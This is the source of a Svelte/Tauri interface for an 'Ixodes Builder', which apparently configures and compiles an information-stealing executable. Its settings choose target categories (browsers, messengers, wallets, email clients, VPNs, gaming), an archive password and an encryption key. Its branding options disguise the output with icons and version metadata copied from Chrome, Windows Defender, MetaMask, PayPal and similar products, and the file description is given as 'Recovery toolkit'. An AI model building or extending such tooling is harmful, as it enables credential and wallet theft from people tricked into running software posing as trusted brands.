<script lang="ts">
  import { invoke } from "@tauri-apps/api/core";
  import { open } from "@tauri-apps/plugin-dialog";
  import { Button } from "$lib/components/ui/button";
  import { CardContent, CardHeader } from "$lib/components/ui/card";
  import {
    Collapsible,
    CollapsibleContent,
    CollapsibleTrigger,
  } from "$lib/components/ui/collapsible";
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { Separator } from "$lib/components/ui/separator";
  import { Switch } from "$lib/components/ui/switch";
  import {
    CircleAlert,
    ChevronDown,
    FolderOpen,
    Hammer,
    KeyRound,
    LockKeyhole,
    ListChecks,
    ShieldCheck,
  } from "@lucide/svelte";

  type BuildResult = {
    success: boolean;
    output: string;
    exe_path: string | null;
    moved_to: string | null;
  };

  const categories = [
    { id: "Browsers", label: "Browsers" },
    { id: "Messengers", label: "Messengers" },
    { id: "Gaming", label: "Gaming" },
    { id: "EmailClients", label: "Email Clients" },
    { id: "VPNs", label: "VPNs" },
    { id: "Wallets", label: "Wallets" },
    { id: "System", label: "System" },
    { id: "Other", label: "Other" },
  ] as const;

  const iconPresets = [
    { id: "none", label: "None" },
    { id: "tauri-default", label: "Tauri default" },
    { id: "adobe-acrobat-reader", label: "Adobe Acrobat Reader" },
    { id: "binance", label: "Binance" },
    { id: "brave", label: "Brave" },
    { id: "chrome", label: "Google Chrome" },
    { id: "cs2", label: "CS2" },
    { id: "discord", label: "Discord" },
    { id: "dropbox", label: "Dropbox" },
    { id: "edge", label: "Microsoft Edge" },
    { id: "epicgames", label: "Epic Games Launcher" },
    { id: "firefox", label: "Mozilla Firefox" },
    { id: "google-drive", label: "Google Drive" },
    { id: "java", label: "Java Runtime Environment" },
    { id: "metamask", label: "MetaMask" },
    { id: "nvidia", label: "NVIDIA Control Panel" },
    { id: "onedrive", label: "Microsoft OneDrive" },
    { id: "opera", label: "Opera" },
    { id: "paypal", label: "PayPal" },
    { id: "rs6", label: "Rainbow Six Siege" },
    { id: "steam", label: "Steam" },
    { id: "teams", label: "Microsoft Teams" },
    { id: "telegram", label: "Telegram" },
    { id: "vlc", label: "VLC Media Player" },
    { id: "windows-defender", label: "Windows Defender" },
    { id: "windows", label: "Windows" },
    { id: "word", label: "Microsoft Word" },
    { id: "zoom", label: "Zoom" },
  ] as const;

  let allowSensitive = $state(false);
  let allowExternal = $state(false);
  let artifactKey = $state("");
  let archivePassword = $state("");
  let outputDir = $state("");
  let iconSource = $state("");
  let iconPreset = $state("none");
  let productName = $state("");
  let fileDescription = $state("");
  let companyName = $state("");
  let productVersion = $state("");
  let fileVersion = $state("");
  let copyright = $state("");
  let categoryState = $state<Record<string, boolean>>(
    Object.fromEntries(categories.map((category) => [category.id, true]))
  );
  let advancedOpen = $state(false);

  let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
  let buildError = $state("");
  let movedTo = $state("");
  let toastMessage = $state("");
  let toastOpen = $state(false);
  let toastTimer: ReturnType<typeof setTimeout> | null = null;
  let successTimer: ReturnType<typeof setTimeout> | null = null;

  $effect(() => {
    if (iconPreset !== "none" && iconSource.trim().length > 0) {
      iconSource = "";
    }
  });

  $effect(() => {
    if (iconSource.trim().length > 0 && iconPreset !== "none") {
      iconPreset = "none";
    }
  });

  const showToast = (message: string) => {
    toastMessage = message;
    toastOpen = true;
    if (toastTimer) {
      clearTimeout(toastTimer);
    }
    toastTimer = setTimeout(() => {
      toastOpen = false;
      toastTimer = null;
    }, 6000);
  };

  const selectedCategories = () =>
    categories.filter((category) => categoryState[category.id]).map((category) => category.id);

  const toggleCategory = (id: string, checked: boolean) => {
    categoryState = { ...categoryState, [id]: checked };
  };

  const chooseOutputDir = async () => {
    const result = await open({
      directory: true,
      multiple: false,
      title: "Select output folder",
    });
    if (!result) return;
    if (Array.isArray(result)) {
      outputDir = result[0] ?? "";
    } else {
      outputDir = result;
    }
  };

  const chooseIconFile = async () => {
    const result = await open({
      directory: false,
      multiple: false,
      title: "Select icon file",
      filters: [
        { name: "Icons", extensions: ["ico", "icns", "png"] },
      ],
    });
    if (!result) return;
    if (Array.isArray(result)) {
      iconSource = result[0] ?? "";
    } else {
      iconSource = result;
    }
  };

  const runBuild = async () => {
    buildStatus = "loading";
    buildError = "";
    movedTo = "";
    if (successTimer) {
      clearTimeout(successTimer);
      successTimer = null;
    }
    try {
          const result = (await invoke("build_ixodes", {
            request: {
              settings: {
                allow_sensitive_tasks: allowSensitive,
                allow_external_api: allowExternal,
                allowed_categories: selectedCategories(),
                artifact_key: artifactKey,
                archive_password: archivePassword,
              },
              branding: {
                icon_source: iconSource,
                icon_preset: iconPreset,
                product_name: productName,
                file_description: fileDescription,
                company_name: companyName,
                product_version: productVersion,
                file_version: fileVersion,
                copyright,
              },
              output_dir: outputDir,
            },
          })) as BuildResult;
      movedTo = result.moved_to ?? "";
      buildStatus = result.success ? "success" : "error";
      if (!result.success) {
        buildError = "Build failed. Check the output for details.";
        showToast(buildError);
      } else {
        successTimer = setTimeout(() => {
          buildStatus = "idle";
          successTimer = null;
        }, 5000);
      }
    } catch (error) {
      buildStatus = "error";
      buildError = String(error);
      showToast(buildError);
    }
  };
</script>

<main class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 py-6">
  {#if toastOpen}
    <div class="fixed right-6 top-6 z-50 max-w-sm rounded-lg border border-border/70 bg-background/95 px-4 py-3 text-sm text-foreground shadow-lg backdrop-blur">
      <div class="flex items-start gap-3">
        <CircleAlert class="mt-0.5 h-4 w-4 text-destructive" />
        <div class="space-y-1">
          <p class="font-semibold">Build failed</p>
          <p class="text-xs text-muted-foreground">{toastMessage}</p>
        </div>
      </div>
    </div>
  {/if}
  <CardHeader class="space-y-4 border-b border-border/60">
    <div class="flex items-center justify-between gap-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <ShieldCheck class="h-4 w-4 text-primary" />
        Ixodes Builder
      </div>
    </div>
  </CardHeader>
  <CardContent class="space-y-10">
    <div class="space-y-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <ListChecks class="h-4 w-4 text-primary" />
        Enabled categories
      </div>
      <p class="text-xs text-muted-foreground">
        Toggle categories to include. Leaving all unchecked allows every category.
      </p>
      <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
        {#each categories as category}
          <div
            class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
            role="button"
            tabindex="0"
            onclick={(event) => {
              const target = event.target as HTMLElement | null;
              if (target?.closest?.("[data-category-switch]")) return;
              toggleCategory(category.id, !categoryState[category.id]);
            }}
            onkeydown={(event) => {
              if (event.key === "Enter" || event.key === " ") {
                event.preventDefault();
                toggleCategory(category.id, !categoryState[category.id]);
              }
            }}
          >
            <Label class="text-sm">{category.label}</Label>
            <Switch
              id={`category-${category.id}`}
              data-category-switch
              class="cursor-pointer"
              checked={categoryState[category.id]}
              onCheckedChange={(checked) => toggleCategory(category.id, Boolean(checked))}
            />
          </div>
        {/each}
      </div>
    </div>

    <div class="space-y-3">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <LockKeyhole class="h-4 w-4 text-primary" />
        Archive Password
      </div>
      <Input
        id="archive-password"
        placeholder="Archive password (optional)"
        bind:value={archivePassword}
      />
    </div>

    <Collapsible bind:open={advancedOpen} class="space-y-4">
      <CollapsibleTrigger>
        <Button
          variant="secondary"
        >
          <span>Advanced</span>
          <ChevronDown
            class={`h-4 w-4 transition-transform ${advancedOpen ? "rotate-180" : ""}`}
          />
        </Button>
      </CollapsibleTrigger>
      <CollapsibleContent class="space-y-4 rounded-lg border border-border/70 bg-muted/20 p-4">
        <div class="grid gap-4 md:grid-cols-2">
          <div class="rounded-md border border-border/70 bg-background/60 p-4">
            <div class="flex items-center justify-between gap-4">
              <div>
                <p class="text-sm font-semibold">Allow sensitive tasks</p>
                <p class="text-xs text-muted-foreground">
                  Enables recovery tasks marked as sensitive.
                </p>
              </div>
              <Switch bind:checked={allowSensitive} />
            </div>
          </div>
          <div class="rounded-md border border-border/70 bg-background/60 p-4">
            <div class="flex items-center justify-between gap-4">
              <div>
                <p class="text-sm font-semibold">Allow external API</p>
                <p class="text-xs text-muted-foreground">
                  Lets recovery tasks call external services.
                </p>
              </div>
              <Switch bind:checked={allowExternal} />
            </div>
          </div>
        </div>
        <div class="space-y-3">
          <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
            <KeyRound class="h-4 w-4 text-primary" />
            Artifact encryption key
          </div>
          <Label class="text-xs text-muted-foreground" for="artifact-key">
            Base64-encoded 32-byte key used for artifact encryption.
          </Label>
          <Input
            id="artifact-key"
            placeholder="Base64 key (optional)"
            bind:value={artifactKey}
          />
        </div>
      </CollapsibleContent>
    </Collapsible>

    <div class="space-y-4">
      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
        <KeyRound class="h-4 w-4 text-primary" />
        Executable branding
      </div>
      <p class="text-xs text-muted-foreground">
        Windows embeds icon and version metadata into the executable. macOS/Linux apply only
        when packaging an app bundle. Preset icons are embedded in the builder. Icons must be
        square and between 256x256 and 512x512.
      </p>
      <div class="grid gap-4 md:grid-cols-2">
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="product-name">
            Product name
          </Label>
          <Input id="product-name" placeholder="Ixodes" bind:value={productName} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="file-description">
            File description
          </Label>
          <Input id="file-description" placeholder="Recovery toolkit" bind:value={fileDescription} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="company-name">
            Company name
          </Label>
          <Input id="company-name" placeholder="Acme Labs" bind:value={companyName} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="product-version">
            Product version
          </Label>
          <Input id="product-version" placeholder="1.0.0.0" bind:value={productVersion} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="file-version">
            File version
          </Label>
          <Input id="file-version" placeholder="1.0.0.0" bind:value={fileVersion} />
        </div>
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="copyright">
            Copyright
          </Label>
          <Input id="copyright" placeholder="© 2026 Example Co." bind:value={copyright} />
        </div>
      </div>
      <div class="grid gap-4 md:grid-cols-[1fr_auto]">
        <Input
          placeholder="Icon URL, file path, or directory"
          bind:value={iconSource}
          disabled={iconPreset !== "none"}
        />
        <Button variant="outline" onclick={chooseIconFile} disabled={iconPreset !== "none"}>
          Choose icon
        </Button>
      </div>
      <div class="grid gap-3 md:grid-cols-[1fr_auto]">
        <div class="space-y-2">
          <Label class="text-xs text-muted-foreground" for="icon-preset">
            Preset icon
          </Label>
          <select
            id="icon-preset"
            class="w-full rounded-md border border-input bg-background px-3 py-2 text-sm text-foreground"
            bind:value={iconPreset}
            disabled={iconSource.trim().length > 0}
          >
            {#each iconPresets as preset}
              <option value={preset.id}>{preset.label}</option>
            {/each}
          </select>
        </div>
      </div>
    </div>

    <Separator />

    <div class="flex flex-wrap items-center justify-between gap-4">
      <Button
        size="lg"
        class={`gap-2 transition-colors ${buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
        onclick={runBuild}
        disabled={buildStatus === "loading"}
      >
        <Hammer class="h-4 w-4" />
        {buildStatus === "loading"
          ? "Building..."
          : buildStatus === "success"
            ? "Success"
            : "Build release"}
      </Button>
      <div class="grid gap-3 md:grid-cols-[1fr_auto]">
        <Input
          placeholder="Defaults to Desktop"
          bind:value={outputDir}
        />
        <Button variant="outline" onclick={chooseOutputDir}>
          Choose folder
        </Button>
      </div>
    </div>

    
  </CardContent>
</main>
